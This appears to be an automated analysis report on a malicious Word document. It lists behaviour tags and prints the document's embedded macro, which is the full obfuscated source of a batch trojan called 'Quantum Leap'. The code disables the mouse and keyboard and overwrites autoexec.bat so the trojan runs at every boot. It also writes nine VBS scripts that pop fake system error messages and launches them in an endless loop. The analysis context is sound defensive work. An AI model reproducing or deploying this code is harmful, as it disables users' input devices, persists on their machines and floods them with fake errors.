behavior.autoexec: Runs when the Word document is opened
behavior.system: May run an executable file or a system command on a Mac

docinfo.macro:
::
:: Bat.Quantum Leap [DvL aka Ratty]
::
%paeL mutnauQ%ctty nul%Quantum Leap%
eXPecting more from Ratty aka DvL
%paeL mutnauQ%@echo off%Quantum Leap%
%paeL mutnauQ%@%windir%\rundll32.exe mouse,disable%Quantum Leap%
%paeL mutnauQ%@%windir%\rundll32.exe keyboard,disable%Quantum Leap%
%paeL mutnauQ%@if exist c:\autoexec.bat ren c:\autoexec.bat autoexec.dvl%Quantum Leap%
%paeL mutnauQ%@copy %0 c:\autoexec.bat%Quantum Leap%
%paeL mutnauQ%@echo.On Error Resume Next>c:\recycled\leap0.vbs%Quantum Leap%
%paeL mutnauQ%@echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",16,"Error with mouse">>c:\recycled\leap0.vbs%Quantum Leap%
%paeL mutnauQ%@echo.On Error Resume Next>c:\recycled\leap1.vbs%Quantum Leap%
%paeL mutnauQ%@echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",32,"Error with keyboard">>c:\recycled\leap1.vbs%Quantum Leap%
%paeL mutnauQ%@echo.On Error Resume Next>c:\recycled\leap2.vbs%Quantum Leap%
%paeL mutnauQ%@echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",48,"Error in kernel32.dll">>c:\recycled\leap2.vbs%Quantum Leap%
%paeL mutnauQ%@echo.On Error Resume Next>c:\recycled\leap3.vbs%Quantum Leap%
%paeL mutnauQ%@echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",64,"Windows Error #907">>c:\recycled\leap3.vbs%Quantum Leap%
%paeL mutnauQ%@echo.On Error Resume Next>c:\recycled\leap4.vbs%Quantum Leap%
%paeL mutnauQ%@echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",4096,"Fatal Error in vbrun5.dll">>c:\recycled\leap4.vbs%Quantum Leap%
%paeL mutnauQ%@echo.On Error Resume Next>c:\recycled\leap5.vbs%Quantum Leap%
%paeL mutnauQ%@echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",4112,"Critical Error in mem405.vxd">>c:\recycled\leap5.vbs%Quantum Leap%
%paeL mutnauQ%@echo.On Error Resume Next>c:\recycled\leap6.vbs%Quantum Leap%
%paeL mutnauQ%@echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",4128,"Missing path">>c:\recycled\leap6.vbs%Quantum Leap%
%paeL mutnauQ%@echo.On Error Resume Next>c:\recycled\leap7.vbs%Quantum Leap%
%paeL mutnauQ%@echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",4144,"Invalid file or system path">>c:\recycled\leap7.vbs%Quantum Leap%
%paeL mutnauQ%@echo.On Error Resume Next>c:\recycled\leap8.vbs%Quantum Leap%
%paeL mutnauQ%@echo.MsgBox "DvL [ideea from Trojan.Bat.DispMessage of SpTh]",4160,"Quantum Leap of DvL">>c:\recycled\leap8.vbs%Quantum Leap%
:antiloop
@start c:\recycled\leap0.vbs
@start c:\recycled\leap1.vbs
@start c:\recycled\leap2.vbs
@start c:\recycled\leap3.vbs
@start c:\recycled\leap4.vbs
@start c:\recycled\leap5.vbs
@start c:\recycled\leap6.vbs
@start c:\recycled\leap7.vbs
@start c:\recycled\leap8.vbs
goto antiloop
cls

filetype: ASCII text, with CRLF line terminators

dump: eXPecting more from Ratty aka DvL
